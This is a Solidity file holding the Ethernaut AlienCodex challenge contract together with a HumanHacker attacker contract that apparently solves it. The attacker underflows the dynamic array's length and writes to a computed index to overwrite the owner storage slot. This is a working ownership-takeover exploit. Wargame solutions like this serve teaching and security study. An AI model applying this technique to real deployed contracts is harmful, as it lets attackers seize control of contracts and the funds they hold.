// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/src/helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}

contract HumanHacker {
    address instance;

    constructor(address _instance) public {
        instance = _instance;
    }

    function start() external {
        uint256 codex  = uint256(keccak256(abi.encode(1))); // codex starting slot

        AlienCodex(instance).makeContact();
        AlienCodex(instance).retract(); // set array size to size of contract via underflow
        AlienCodex(instance).revise(2 ** 256 - 1 - codex + 1, bytes32(uint256(uint160(msg.sender)))); // minus 1 plus 1 to avoid data type error
    }
}